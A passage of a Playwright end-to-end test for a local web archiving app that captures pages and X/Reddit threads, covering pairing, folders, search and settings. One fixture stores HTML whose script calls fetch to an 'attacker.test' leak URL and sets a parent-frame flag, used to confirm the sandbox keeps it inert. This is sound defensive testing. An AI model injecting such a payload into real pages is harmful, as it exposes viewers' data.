import { expect } from "@playwright/test";
import assert from "node:assert/strict";
import { readFile, writeFile, mkdir, rm, symlink } from "node:fs/promises";
import { spawn } from "node:child_process";
import path from "node:path";
import os from "node:os";
import { launchBrowser } from "../scripts/browser.mjs";
import { fixtureBridge } from "../scripts/fixture-bridge.mjs";
import { staticServer } from "../scripts/dev.mjs";
import { archiveResources, rewrite } from "../extension/src/archive.js";
const root = path.resolve(".test-data/e2e");
await rm(root, { recursive: true, force: true });
await mkdir(root, { recursive: true });
await mkdir("artifacts", { recursive: true });
const recording = process.env.GLASSMARK_RECORD === "1";
let nativeProcess, bridge, server, browser, context;
const checks = [];
const pass = (name) => {
  checks.push(name);
  console.log("PASS", name);
};
try {
  let connection;
  if (process.env.GLASSMARK_BRIDGE_BIN) {
    const file = root + "/connection.json";
    nativeProcess = spawn(path.resolve(process.env.GLASSMARK_BRIDGE_BIN), [], {
      env: {
        ...process.env,
        GLASSMARK_DATA: root,
        GLASSMARK_CONNECTION_FILE: file,
      },
      stdio: ["ignore", "inherit", "inherit"],
    });
    for (let i = 0; i < 100; i++) {
      try {
        connection = JSON.parse(await readFile(file, "utf8"));
        break;
      } catch {
        await new Promise((r) => setTimeout(r, 100));
      }
    }
    if (!connection) throw new Error("Native bridge did not start");
    console.log("Backend: production Rust bridge");
  } else {
    bridge = await fixtureBridge(root);
    connection = bridge.connection;
    console.log(
      "Backend: development fixture bridge (native validation requires CI)",
    );
  }
  server = await staticServer(connection);
  const call = async (endpoint, options = {}) => {
    const response = await fetch(connection.base + endpoint, {
      ...options,
      headers: {
        Authorization: "Bearer " + connection.token,
        ...options.headers,
      },
    });
    if (!response.ok) throw new Error(await response.text());
    return response;
  };
  const get = async (endpoint) => (await call(endpoint)).json();
  const post = async (endpoint, data, method = "POST") =>
    (
      await call(endpoint, {
        method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      })
    ).json();
  assert.equal((await fetch(connection.base + "/api/items")).status, 401);
  assert.equal(
    (
      await fetch(connection.base + "/health", {
        headers: { Origin: "https://attacker.test" },
      })
    ).status,
    403,
  );
  pass("unauthorized access and hostile web origins are blocked");
  await post(
    "/api/preferences",
    { ...(await get("/api/preferences")), language: "zh-CN" },
    "PUT",
  );
  const pairing = await post("/api/pairing", {});
  assert.equal(
    (
      await fetch(connection.base + "/pair", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code: "wrong" }),
      })
    ).status,
    401,
  );
  const paired = await (
    await fetch(connection.base + "/pair", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code: pairing.code, name: "E2E Chromium" }),
    })
  ).json();
  assert.ok(paired.token);
  assert.equal(
    (
      await fetch(connection.base + "/api/items", {
        headers: { Authorization: "Bearer " + paired.token },
      })
    ).status,
    403,
  );
  pass("pairing issues a scoped device token");
  if (recording) {
    const cache = path.join(os.homedir(), ".cache/ms-playwright/ffmpeg-1011");
    await mkdir(cache, { recursive: true });
    try {
      await symlink("/usr/bin/ffmpeg", cache + "/ffmpeg-linux");
    } catch {}
  }
  browser = await launchBrowser();
  context = await browser.newContext({
    viewport: { width: 1440, height: 960 },
    deviceScaleFactor: 1,
    ...(recording
      ? {
          recordVideo: {
            dir: "artifacts/raw-video",
            size: { width: 1440, height: 960 },
          },
        }
      : {}),
  });
  const errors = [];
  const page = await context.newPage();
  page.on("pageerror", (e) => errors.push(e.message));
  const source = await browser.newPage({
    viewport: { width: 1000, height: 1000 },
  });
  const captureScript = await readFile(
    "dist/extension-chromium/content.js",
    "utf8",
  );
  async function fixtureFonts() {
    const text = await source.locator("body").innerText();
    const points = [...new Set([...text].map((c) => c.codePointAt(0)))];
    const css = await readFile(
      "node_modules/@fontsource/noto-sans-sc/400.css",
      "utf8",
    );
    let embedded = "";
    for (const match of css.matchAll(/@font-face\s*\{([^}]+)\}/g)) {
      const rule = match[1];
      const ranges = [
        ...rule.matchAll(/U\+([0-9a-f]+)(?:-([0-9a-f]+))?/gi),
      ].map((m) => [parseInt(m[1], 16), parseInt(m[2] || m[1], 16)]);
      if (!points.some((p) => ranges.some(([a, b]) => p >= a && p <= b)))
        continue;
      const file = rule.match(/url\(\.\/([^)]*woff2)\)/)?.[1];
      if (!file) continue;
      const bytes = await readFile(
        "node_modules/@fontsource/noto-sans-sc/" + file,
      );
      embedded +=
        "@font-face{" +
        rule.replace(
          /src:[^;]+;/,
          `src:url(data:font/woff2;base64,${bytes.toString("base64")}) format('woff2');`,
        ) +
        "}";
    }
    await source.addStyleTag({ content: embedded });
  }
  async function collect(url, mode = "page", options = {}) {
    await source.goto(url);
    await fixtureFonts();
    await source.addStyleTag({
      content: "*{font-family:'Noto Sans SC',sans-serif!important}",
    });
    await source.evaluate(() => document.fonts.ready);
    await source.addScriptTag({ content: captureScript });
    return source.evaluate((opts) => GlassmarkCapture.collect(opts), {
      mode,
      language: "zh-CN",
      ...options,
    });
  }
  async function save(capture) {
    const resources = await archiveResources(capture.resources, {
      approve: async () => true,
      upload: async (name, bytes, mime) => {
        await call("/api/blobs/" + name, {
          method: "PUT",
          headers: { "Content-Type": mime },
          body: bytes,
        });
      },
    });
    const item = await post("/api/items", {
      ...capture,
      content: capture.content ? rewrite(capture.content, resources) : null,
      resources,
    });
    return item;
  }
  await page.goto("http://localhost:1420");
  await page.addStyleTag({ url: "/test-fonts/400.css" });
  await page.addStyleTag({
    content:
      "body,button,input,select{font-family:'Noto Sans SC',sans-serif!important}",
  });
  await page.evaluate(() => document.fonts.ready);
  await page.locator('html[data-app-ready="true"]').waitFor();
  await page
    .locator("#reader .empty-reader p")
    .getByText("暂无内容", { exact: true })
    .waitFor();
  if (recording) {
    await page.evaluate(() => {
      const note = document.createElement("div");
      note.textContent = "界面与捕获演示 · 测试网页 · 开发测试服务，非原生运行";
      note.style.cssText =
        "position:fixed;right:18px;bottom:10px;z-index:9999;font:10px sans-serif;color:#778e9d;background:#ffffffcc;padding:6px 10px;border:1px solid #dde6ec;border-radius:7px;pointer-events:none";
      document.body.append(note);
    });
    await page.waitForTimeout(1800);
  }
  const avatarUrl = "http://127.0.0.1:1420/fixtures/avatar.svg";
  const article = await collect("http://127.0.0.1:1420/fixtures/article.html");
  await source.evaluate((url) => {
    const image = document.createElement("img");
    image.id = "web-avatar";
    image.src = url;
    image.width = 32;
    image.height = 32;
    document.body.prepend(image);
  }, avatarUrl);
  const withAvatar = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "page" }),
  );
  Object.assign(article, withAvatar);
  assert.ok(article.resources.includes(avatarUrl));
  assert.match(article.content, /把日常/);
  assert.doesNotMatch(article.content, /<script/);
  assert.match(article.content, /id="sky"/);
  assert.match(article.content, /url\(&quot;#sky/);
  const articleItem = await save(article);
  pass(
    "full-page capture preserves computed styles, SVG fragments, fonts and media",
  );
  await page.locator("[data-item]").first().waitFor({ timeout: 20000 });
  await page
    .frameLocator("#saved-page")
    .getByRole("heading", { name: "把日常，过成值得收藏的风景", exact: true })
    .waitFor();
  assert.equal(
    await page.locator("#saved-page").getAttribute("sandbox"),
    "allow-same-origin",
  );
  await expect(
    page.frameLocator("#saved-page").locator("#web-avatar"),
  ).toBeVisible();
  await expect
    .poll(() =>
      page
        .frameLocator("#saved-page")
        .locator("#web-avatar")
        .evaluate((i) => i.complete && i.naturalWidth > 0),
    )
    .toBe(true);
  if (recording) await page.waitForTimeout(3000);
  await page.screenshot({ path: "artifacts/glassmark-article.png" });
  // Multiple selected roots are combined without their unrelated siblings.
  await source.evaluate(
    () =>
      (globalThis.__glassmarkSelection = [
        document.querySelector("h1"),
        document.querySelector("blockquote"),
      ]),
  );
  const selected = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "selection" }),
  );
  assert.match(selected.text, /生活的质感/);
  assert.doesNotMatch(selected.text, /建立属于/);
  pass("multi-region capture excludes unrelated siblings");
  const firstFolder = await post("/api/folders", {
    name: "灵感花园",
    parentId: null,
  });
  const nested = await post("/api/folders", {
    name: "网页设计",
    parentId: firstFolder.id,
  });
  await post(
    "/api/items/" + articleItem.id,
    { folderId: nested.id, tags: ["设计", "日常"] },
    "PUT",
  );
  const cycle = await fetch(
    connection.base + "/api/folders/" + firstFolder.id,
    {
      method: "PUT",
      headers: {
        Authorization: "Bearer " + connection.token,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ name: "灵感花园", parentId: nested.id }),
    },
  );
  assert.equal(cycle.status, 400);
  pass("folders support nesting and reject cycles");
  await source.route("https://x.com/**", (route) =>
    route.fulfill({ contentType: "text/html", path: "tests/fixtures/x.html" }),
  );
  const x = await collect("https://x.com/lin/status/1001", "thread", {
    maxPosts: 3,
  });
  await source.evaluate((url) => {
    const wrapper = document.createElement("span");
    wrapper.dataset.testid = "UserAvatar";
    const img = document.createElement("img");
    img.src = url;
    wrapper.append(img);
    document.querySelector("article").prepend(wrapper);
  }, avatarUrl);
  Object.assign(
    x,
    await source.evaluate(() =>
      GlassmarkCapture.collect({ mode: "thread", maxPosts: 3 }),
    ),
  );
  assert.ok(x.resources.includes(avatarUrl));
  assert.equal(x.posts[0].avatarUrl, avatarUrl);
  assert.equal(x.posts.length, 3);
  assert.equal(x.platform, "x");
  assert.equal(x.posts[0].authorName, "Lin");
  assert.equal(x.posts[0].stats.likes, "128");
  assert.equal(x.posts[0].media.length, 1);
  assert.equal(x.posts.find((p) => p.id === "1002")?.parentId, "1001");
  assert.equal(x.posts.find((p) => p.id === "1003")?.parentId, "1002");
  assert.equal(
    x.posts.find((p) => p.id === "1003")?.replyToHandle,
    "@chenbuilds",
  );

  const wholeSocial = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "page" }),
  );
  assert.equal(wholeSocial.posts.length, 3);
  assert.equal(wholeSocial.platform, "x");
  assert.equal(wholeSocial.content, null);
  pass(
    "X URL detail always saves one structured main post with its replies, never a whole-page feed",
  );
  const xItem = await save(x);
  const lean = await source.evaluate(async () => {
    const read = window.getComputedStyle;
    window.getComputedStyle = () => {
      throw new Error("social capture must not walk CSS");
    };
    try {
      return await GlassmarkCapture.collect({ mode: "thread", maxPosts: 0 });
    } finally {
      window.getComputedStyle = read;
    }
  });
  assert.equal(lean.posts.length, 1);
  assert.equal(lean.content, null);
  pass(
    "posts save directly as structured content and persist avatars without walking CSS",
  );
  await page.locator('button[data-view="x"]').click();
  await page
    .locator(`.x-post[data-open-archive="${xItem.id}"]`)
    .waitFor({ timeout: 20000 });
  assert.equal(await page.locator("#items,.collection").count(), 0);
  assert.equal(
    await page
      .locator(".x-site-nav,.x-local-profile,.x-right,.x-feed-tabs")
      .count(),
    0,
  );
  assert.equal(
    await page
      .getByRole("tab", { name: "全部收藏", exact: true })
      .textContent(),
    "全部收藏",
  );
  assert.equal(
    await page.locator(".x-saved-sidebar .saved-nav-entry").count(),
    1,
  );
  assert.equal(
    await page.getByRole("searchbox", { name: "搜索 X 收藏" }).isVisible(),
    true,
  );
  assert.ok((await page.locator('[data-icon-source="lucide"]').count()) > 15);
  assert.equal(await page.locator("#folders").isVisible(), false);
  assert.equal(await page.locator("#saved-page").count(), 0);
  assert.equal(
    await page
      .locator(`.x-post[data-open-archive="${xItem.id}"] .social-avatar img`)
      .evaluate((i) => i.complete && i.naturalWidth > 0),
    true,
  );
  await page.screenshot({ path: "artifacts/glassmark-x.png" });
  await page
    .locator(`.x-post[data-open-archive="${xItem.id}"] .x-post-text`)
    .click();
  assert.equal(await page.locator(".x-reply").count(), 2);
  assert.equal(await page.locator(".discussion-scope").count(), 0);
  await page.getByRole("button", { name: "返回收藏", exact: true }).click();
  pass("X has a saved-content timeline and structured thread detail");
  // Model a virtualized feed: only one DOM article exists at any point.
  await source.evaluate(() => {
    document.querySelectorAll("article").forEach((el, i) => {
      if (i) el.remove();
    });
    let next = 2000;
    window.scrollBy = () => {
      const el = document.querySelector("article");
      el.querySelector("a").href = "/user/status/" + next++;
      el.querySelector('[data-testid="tweetText"]').textContent =
        "Virtual reply " + next;
    };
  });
  const virtual = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "thread", maxPosts: 2 }),
  );
  assert.equal(virtual.posts.length, 3);
  assert.ok(virtual.posts.some((p) => /Virtual reply/.test(p.text)));
  assert.equal(virtual.content, null);
  pass("X accumulation retains posts removed by virtual scrolling");
  await source.route("https://www.reddit.com/**", (route) =>
    route.fulfill({
      contentType: "text/html",
      path: "tests/fixtures/reddit.html",
    }),
  );
  const reddit = await collect(
    "https://www.reddit.com/r/digitalgardens/comments/abc/archive/",
    "thread",
  );
  assert.equal(reddit.posts.length, 4);
  assert.equal(reddit.posts.find((p) => p.id === "two")?.parentId, "one");
  assert.equal(
    reddit.posts.find((p) => p.id === "one")?.authorName,
    "quietreader",
  );

  const redditItem = await save(reddit);
  pass(
    "Reddit captures loaded post and comments without requesting hidden comments",
  );
  await page.locator('button[data-view="reddit"]').click();
  await page
    .locator(`.reddit-post[data-open-archive="${redditItem.id}"]`)
    .waitFor({ timeout: 20000 });
  await page
    .locator(`.reddit-post[data-open-archive="${redditItem.id}"]`)
    .click();
  assert.equal(await page.locator(".reddit-comment").count(), 3);
  assert.match(
    await page.locator(".reddit-post-text").textContent(),
    /I've been/,
  );
  assert.doesNotMatch(
    await page.locator(".reddit-post-text").textContent(),
    /#39/,
  );
  await page.screenshot({ path: "artifacts/glassmark-reddit.png" });
  await page.getByRole("button", { name: "返回收藏", exact: true }).click();
  pass("Reddit has a saved-content feed and persistent comment tree");
  await source.evaluate(() => {
    const el = document.querySelector("shreddit-comment");
    for (let i = 0; i < 105; i++) {
      const copy = el.cloneNode(true);
      copy.setAttribute("thingid", "t1_extra_" + i);
      document.querySelector("main").append(copy);
    }
  });
  const many = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "thread" }),
  );
  assert.equal(many.posts.length, 109);
  pass("Reddit saves all loaded comments even when more than 100 are visible");
  const manyItem = await save(many);
  await page
    .locator(`.reddit-post[data-open-archive="${manyItem.id}"]`)
    .waitFor({ timeout: 20000 });
  await page
    .locator(`.reddit-post[data-open-archive="${manyItem.id}"] h1`)
    .click();
  assert.equal(await page.locator(".reddit-comment").count(), 108);
  assert.match(
    await page.locator(".reddit-comments-title").textContent(),
    /108/,
  );
  await page.locator(".reddit-comment").last().scrollIntoViewIfNeeded();
  assert.equal(await page.locator(".reddit-comment").last().isVisible(), true);
  await page.getByRole("button", { name: "返回收藏", exact: true }).click();
  await call("/api/items/" + manyItem.id, { method: "DELETE" });
  pass(
    "discussion detail renders every archived comment, including more than 100 replies",
  );

  const duplicate = await save({ ...article, resources: [] });
  assert.notEqual(duplicate.id, articleItem.id);
  pass("repeated captures create independent archive IDs");
  await page.locator('button[data-view="web"]').click();
  await page.locator("[data-item]").first().waitFor();
  await page.locator("#search").fill("生活的质感");
  await page.waitForTimeout(700);
  assert.ok(
    (await get("/api/items?q=" + encodeURIComponent("生活的质感"))).length >= 1,
  );
  await page.locator(".tree-file").first().waitFor();
  pass("full-text search finds body text, including Chinese");
  if (recording) await page.waitForTimeout(2000);
  await page.locator("#search").fill("");
  await page.waitForTimeout(700);
  await page.locator(`[data-item="${articleItem.id}"]`).click();
  await page.locator("#tag-button").click();
  await page.locator(".new-tag-inline summary").click();
  await page.locator("#new-item-tag").fill("灵感");
  await page.locator("#create-item-tag").click();
  await page.locator('.tag-choice input[value="灵感"]').waitFor();
  assert.equal(
    await page.locator('.tag-choice input[value="设计"]').isChecked(),
    true,
  );
  await page.getByRole("button", { name: "保存标签", exact: true }).click();
  await page.getByText("# 灵感", { exact: true }).first().waitFor();
  pass("tag editing updates the library and filters");
  await page.locator("#settings").click();
  await expect(page.locator("#dialog-title")).toBeFocused();
  await page.locator('[data-settings-category="sync"]').click();
  await expect(page.locator("#dav-enabled")).toHaveCount(0);
  await expect(
    page.locator('[data-sync-config="webdav"] #settings-sync-now'),
  ).toBeVisible();
  await expect(
    page.locator('[data-sync-config="webdav"] #sync-conflicts'),
  ).toHaveCount(1);
  await expect(
    page.locator('[data-sync-config="webdav"] #dav-interval'),
  ).toBeVisible();
  await page.locator("#dav-password").fill("test-app-password");
  await page.locator("#sync-password-toggle").click();
  await expect(page.locator("#dav-password")).toHaveAttribute("type", "text");
  await page.locator("#sync-password-toggle").click();
  await expect(page.locator("#dav-password")).toHaveAttribute(
    "type",
    "password",
  );
  await page.locator("#dav-password").fill("");
  await page.screenshot({ path: "artifacts/glassmark-sync-settings.png" });
  await page.locator('[data-sync-mode="local"]').click();
  await expect(
    page.locator("#dav-interval,#settings-sync-now,#sync-conflicts"),
  ).toHaveCount(0);
  await page.locator("#sync-local-path").fill("/tmp/glassmark-sync");
  await page.locator('[data-sync-mode="webdav"]').click();
  await expect(page.locator("#dav-url")).toBeVisible();
  await page.locator('[data-sync-mode="local"]').click();
  assert.equal(
    await page.locator("#sync-local-path").inputValue(),
    "/tmp/glassmark-sync",
  );
  await page.locator('[data-settings-category="general"]').click();
  pass(
    "settings focus the title and retain the local sync path when switching providers",
  );
  await page.getByLabel("显示保存时间", { exact: true }).uncheck();
  await page.locator('[data-settings-category="media"]').click();
  await page.getByLabel("单次下载上限（MB）", { exact: true }).fill("750");
  await page.getByLabel("并发下载数", { exact: true }).fill("4");
  await page.locator('[data-settings-category="capture"]').click();
  await page.getByLabel("自动加载时长（秒）", { exact: true }).fill("12");
  await page.getByRole("button", { name: "保存设置", exact: true }).click();
  await expect(page.locator("#page-metadata > span").last()).toBeHidden();
  const prefs = await get("/api/preferences");
  assert.equal(prefs.downloadLimitMb, 750);
  assert.equal(prefs.downloadConcurrency, 4);
  assert.equal(prefs.autoLoadSeconds, 12);
  const extensionOptions = await get("/api/capture-options");
  assert.equal(extensionOptions.preferences.downloadLimitMb, 750);
  pass(
    "grouped settings persist capture duration and shared media limits for the extension",
  );
  await page.locator("#settings").click();
  await page.locator('[data-settings-category="connection"]').click();
  await page.locator("#pairing-code").waitFor();
  assert.match(await page.locator("#pairing-code").textContent(), /^\d{6}$/);
  // Settings must fit compact laptop windows; only the middle panel scrolls.
  const oldViewport = page.viewportSize();
  for (const viewport of [
    { width: 960, height: 640 },
    { width: 1280, height: 720 },
  ]) {
    await page.setViewportSize(viewport);
    const bounds = await page.locator("#dialog").evaluate((el) => {
      const dialog = el.getBoundingClientRect();
      const footer = el
        .querySelector(".dialog-actions")
        .getBoundingClientRect();
      const header = el.querySelector(".dialog-header").getBoundingClientRect();
      return {
        bottom: dialog.bottom,
        footer: footer.bottom,
        header: header.height,
        height: innerHeight,
      };
    });
    assert.ok(bounds.footer <= bounds.bottom && bounds.bottom <= bounds.height);
    assert.ok(bounds.header <= 60);
    await expect(
      page.getByRole("button", { name: "保存设置", exact: true }),
    ).toBeInViewport();
  }
  await page.evaluate(() => {
    Object.defineProperty(navigator, "clipboard", {
      configurable: true,
      value: {
        writeText: async (text) => {
          globalThis.copiedPairing = text;
        },
      },
    });
  });
  await page.getByRole("button", { name: "复制配对码", exact: true }).click();
  assert.equal(
    await page.evaluate(() => globalThis.copiedPairing),
    await page.locator("#pairing-code").textContent(),
  );
  await page.setViewportSize(oldViewport);
  if (recording) await page.waitForTimeout(2500);
  await page.screenshot({ path: "artifacts/glassmark-settings.png" });
  await page.getByRole("button", { name: "关闭", exact: true }).click();
  await page.locator("#settings").click();
  await page.locator('[data-platform-pref="reddit"]').uncheck();
  await page.getByRole("button", { name: "保存设置", exact: true }).click();
  await expect(page.locator('button[data-view="reddit"]')).toHaveCount(0);
  await expect(page.locator('button[data-view="xiaohongshu"]')).toBeVisible();
  await page.reload();
  await page.addStyleTag({ url: "/test-fonts/400.css" });
  await page.addStyleTag({
    content:
      "body,button,input,select{font-family: 'Noto Sans SC', sans-serif!important}",
  });
  await page.evaluate(() => document.fonts.ready);
  await expect(page.locator('button[data-view="reddit"]')).toHaveCount(0);
  await page.locator("#settings").click();
  await page.locator('[data-platform-pref="reddit"]').check();
  await page.getByRole("button", { name: "保存设置", exact: true }).click();
  pass(
    "compact settings keep actions visible; pairing copies exact digits; sidebar platform choices persist",
  );
  // A hostile archive must remain inert and make no network requests.
  const hostile = await post("/api/items", {
    version: 2,
    title: "Sandbox test",
    url: "https://example.test",
    platform: "web",
    mode: "page",
    capturedAt: new Date().toISOString(),
    text: "sandbox",
    content:
      '<html><head></head><body><script>parent.__PWNED=1;fetch("https://attacker.test/leak")</script><img src="https://attacker.test/image"><button onclick="parent.__PWNED=2">inert button</button></body></html>',
    resources: [],
    posts: [],
    warnings: [],
  });
  const leaked = [];
  page.on("request", (r) => {
    if (r.url().includes("attacker.test")) leaked.push(r.url());
  });
  await page.locator(`[data-item="${hostile.id}"]`).waitFor({ timeout: 20000 });
  await page.locator(`[data-item="${hostile.id}"]`).click();
  await page.frameLocator("#saved-page").getByText("inert button").click();
  await page.waitForTimeout(300);
  assert.equal(await page.evaluate(() => globalThis.__PWNED), undefined);
  assert.equal(leaked.length, 0);
  pass("sandbox blocks scripts, event handlers and network access");
  await call("/api/items/" + hostile.id, { method: "DELETE" });
  await call("/api/items/" + duplicate.id, { method: "DELETE" });
  await page.waitForTimeout(3300);
  await page.locator(`[data-item="${articleItem.id}"]`).click();
  await page
    .frameLocator("#saved-page")
    .getByRole("heading", { name: "把日常，过成值得收藏的风景", exact: true })
    .waitFor();
  if (recording) await page.waitForTimeout(1800);
  assert.equal(await page.locator("[data-item]").count(), 1);
  await page.locator(`[data-folder="${firstFolder.id}"]`).click();
  assert.equal(await page.locator("[data-item]").count(), 1);
  assert.equal(
    await page
      .locator(
        `[data-tree-folder="${nested.id}"] > .folder-children > [data-item="${articleItem.id}"]`,
      )
      .count(),
    1,
  );
  assert.equal(await page.locator("#items,.collection").count(), 0);
  await page.locator(`[data-collapse="${firstFolder.id}"]`).click();
  assert.equal(
    await page.locator(`[data-item="${articleItem.id}"]`).count(),
    0,
  );
  assert.equal(await page.locator(`[data-folder="${nested.id}"]`).count(), 0);
  await page.locator(`[data-collapse="${firstFolder.id}"]`).click();
  assert.equal(await page.locator(`[data-folder="${nested.id}"]`).count(), 1);
  await page.locator(`[data-collapse="${nested.id}"]`).click();
  assert.equal(
    await page.locator(`[data-item="${articleItem.id}"]`).count(),
    0,
  );
  await page.locator("#search").fill("生活的质感");
  await page
    .locator(`.global-result[data-global-id="${articleItem.id}"]`)
    .waitFor();
  await expect(page.locator(".window-titlebar")).toHaveText("");
  await expect(
    page.locator(".global-results .eyebrow,.global-results h1"),
  ).toHaveCount(0);
  await expect(page.locator(".toolbar-actions")).toBeHidden();
  await expect(page.locator("#page-zoom")).toBeHidden();
  assert.ok(
    (await page
      .locator(".global-result")
      .first()
      .evaluate(
        (el) =>
          el.getBoundingClientRect().top -
          document.querySelector("#reader").getBoundingClientRect().top,
      )) < 32,
  );
  await page
    .locator(`.global-result[data-global-id="${articleItem.id}"]`)
    .click();
  await page.locator(`[data-item="${articleItem.id}"]`).waitFor();
  assert.equal(
    await page.locator(".folder-root,#web-folder-section").count(),
    0,
  );
  await page.locator("#search").fill("");
  await page.waitForTimeout(700);
  if (
    (await page
      .locator(`[data-collapse="${nested.id}"]`)
      .getAttribute("aria-expanded")) === "false"
  )
    await page.locator(`[data-collapse="${nested.id}"]`).click();
  pass("global results open nested webpage files under the Web root");
  await page.locator(`[data-item="${articleItem.id}"]`).evaluate((el) => {
    globalThis.draggedNode = el;
    el.dispatchEvent(
      new DragEvent("dragstart", {
        bubbles: true,
        dataTransfer: new DataTransfer(),
      }),
    );
  });
  await page.waitForTimeout(3300);
  assert.equal(
    await page.evaluate(() => globalThis.draggedNode.isConnected),
    true,
  );
  await page.evaluate(() =>
    globalThis.draggedNode.dispatchEvent(
      new DragEvent("dragend", { bubbles: true }),
    ),
  );
  pass(
    "background polling preserves the active dragged file and its drop targets",
  );
  await page
    .locator(`[data-item="${articleItem.id}"]`)
    .dragTo(page.locator(`[data-folder="${firstFolder.id}"]`));
  await page
    .locator(
      `[data-tree-folder="${firstFolder.id}"] > .folder-children > [data-item="${articleItem.id}"]`,
    )
    .waitFor();
  await page
    .locator(`[data-item="${articleItem.id}"]`)
    .dragTo(page.locator(`[data-folder="${nested.id}"]`));
  await page
    .locator(
      `[data-tree-folder="${nested.id}"] > .folder-children > [data-item="${articleItem.id}"]`,
    )
    .waitFor();
  pass("dragging webpage files moves them between folder tree branches");
  const glass = await page.locator("#sidebar").evaluate((el) => ({
    background: getComputedStyle(el).backgroundColor,
    blur: getComputedStyle(el).backdropFilter,
  }));
  assert.match(glass.background, /0\.42/);
  assert.match(glass.blur, /blur\(30px\)/);
  await page.locator("body").evaluate((el) => el.classList.add("native-glass"));
  const nativeTint = await page
    .locator("#sidebar")
    .evaluate((el) => getComputedStyle(el).backgroundColor);
  assert.equal(nativeTint, glass.background);
  await page
    .locator("body")
    .evaluate((el) => el.classList.remove("native-glass"));
  pass(
    "webpage files live inside nested folders, collapse with them, and sidebar uses translucent material",
  );
  // Additional real collector outputs make the design walkthrough an actual multi-post feed.
  for (const [index, profile] of [
    {
      name: "Mia Chen",
      handle: "mia_reads",
      text: "保存网页，不只是留下一个链接。\n\n保留原来的排版、图片和讨论，未来回看的时候，才会重新遇到当时的灵感。",
      likes: "86",
    },
    {
      name: "Noah",
      handle: "noahbuilds",
      text: "A good tool should make the web feel a little more personal.\n\nLocal-first. Your files. Your folders. Your own corner of the internet.",
      likes: "214",
    },
    {
      name: "Evan",
      handle: "evan_design",
      text: "最近收集了一些关于设计与生活的讨论。\n\n比起收藏数量，更在意下一次还能不能找到。",
      likes: "52",
    },
  ].entries()) {
    await collect("https://x.com/lin/status/1001", "thread", { maxPosts: 3 });
    await source.evaluate(
      ({ index, profile }) => {
        const root = document.querySelector("article");
        root.querySelector('[data-testid="User-Name"]').innerHTML =
          profile.name + "<small>@" + profile.handle + " · 1 小时</small>";
        root.querySelector('[data-testid="tweetText"]').textContent =
          profile.text;
        root.setAttribute("data-likes", profile.likes);
        root.querySelector('a[href*="/status/"]').href =
          "/" + profile.handle + "/status/" + (3000 + index);
        if (index !== 1) root.querySelector(".photo")?.remove();
        history.replaceState(
          null,
          "",
          "/" + profile.handle + "/status/" + (3000 + index),
        );
        document.title = profile.name + " / X";
      },
      { index, profile },
    );
    const extra = await source.evaluate(() =>
      GlassmarkCapture.collect({ mode: "thread", maxPosts: 3 }),
    );
    await save(extra);
  }
  for (const [index, community] of ["LocalLLaMA", "webdev"].entries()) {
    await collect(
      "https://www.reddit.com/r/digitalgardens/comments/abc/archive/",
      "thread",
    );
    await source.evaluate(
      ({ index, community }) => {
        const post = document.querySelector("shreddit-post");
        post.setAttribute("subreddit-prefixed-name", "r/" + community);
        post.setAttribute("id", "t3_demo" + index);
        post.querySelector("h1").textContent = index
          ? "Show your personal side projects. What are you building?"
          : "What does your local-first research workflow look like?";
        post.querySelector('[slot="text-body"]').innerHTML = index
          ? "<p>Small tools, independent projects, and things built just because you wanted them to exist. Share something you have been working on.</p>"
          : "<p>I have been building a personal library of papers, threads and useful discussions. Curious how everyone organizes their notes and saved posts.</p>";
        post.setAttribute("score", index ? "384" : "127");
        post.setAttribute("comment-count", index ? "62" : "29");
        history.replaceState(
          null,
          "",
          "/r/" + community + "/comments/demo" + index + "/archive/",
        );
        document.title =
          post.querySelector("h1").textContent + " : r/" + community;
      },
      { index, community },
    );
    await save(
      await source.evaluate(() => GlassmarkCapture.collect({ mode: "thread" })),
    );
  }
  await page.waitForTimeout(3300);
  await page.locator('button[data-view="x"]').click();
  await page.locator(".x-post").first().waitFor();
  assert.equal(await page.locator(".x-post").count(), 4);
  const socialRequests = [];
  page.on("request", (r) => {
    if (/^https?:/.test(r.url()) && !/127\.0\.0\.1|localhost/.test(r.url()))
      socialRequests.push(r.url());
  });
  await page
    .locator(".x-post img[data-archive-media]")
    .first()
    .waitFor({ state: "visible" });
  await page.locator(".x-post .author-name").first().click();
  assert.equal(await page.locator(".x-post").count(), 1);
  await page.locator('[data-social-action="clear-filter"]').click();
  assert.equal(await page.locator(".x-post").count(), 4);
  await page.getByRole("searchbox", { name: "搜索 X 收藏" }).fill("noahbuilds");
  await page.getByRole("searchbox", { name: "搜索 X 收藏" }).press("Enter");
  await page.waitForTimeout(500);
  assert.equal(await page.locator(".x-post").count(), 1);
  await page.getByRole("searchbox", { name: "搜索 X 收藏" }).fill("");
  await page.getByRole("searchbox", { name: "搜索 X 收藏" }).press("Enter");
  await page.waitForTimeout(500);
  assert.equal(await page.locator(".x-post").count(), 4);
  pass(
    "X saved navigation searches local bookmarks without restoring home or explore",
  );
  await page.screenshot({ path: "artifacts/glassmark-x.png" });
  await page.locator('button[data-view="reddit"]').click();
  await expect(page.locator(".reddit-post")).toHaveCount(3);
  await expect(
    page.locator(".reddit-archive-header .reddit-wordmark"),
  ).toBeVisible();
  assert.equal(
    await page
      .locator(".reddit-shell .x-shell,.reddit-shell .saved-site-sidebar")
      .count(),
    0,
  );
  assert.equal(
    await page
      .locator(
        ".reddit-site-nav,.reddit-profile,.reddit-right,.reddit-global-header",
      )
      .count(),
    0,
  );
  assert.equal(
    await page
      .locator(
        '[data-social-action="home"],[data-social-action="focus-search"]',
      )
      .count(),
    0,
  );
  await page.locator('.saved-communities [data-community="webdev"]').click();
  assert.equal(await page.locator(".reddit-post").count(), 1);
  await page.locator(".reddit-saved-sidebar .saved-nav-entry").click();
  await expect(page.locator(".reddit-post")).toHaveCount(3);
  await page
    .getByRole("searchbox", { name: "搜索 Reddit 收藏" })
    .fill("What makes a personal archive");
  await page
    .getByRole("searchbox", { name: "搜索 Reddit 收藏" })
    .press("Enter");
  await page.waitForTimeout(500);
  assert.equal(await page.locator(".reddit-post").count(), 1);
  await page.getByRole("searchbox", { name: "搜索 Reddit 收藏" }).fill("");
  await page
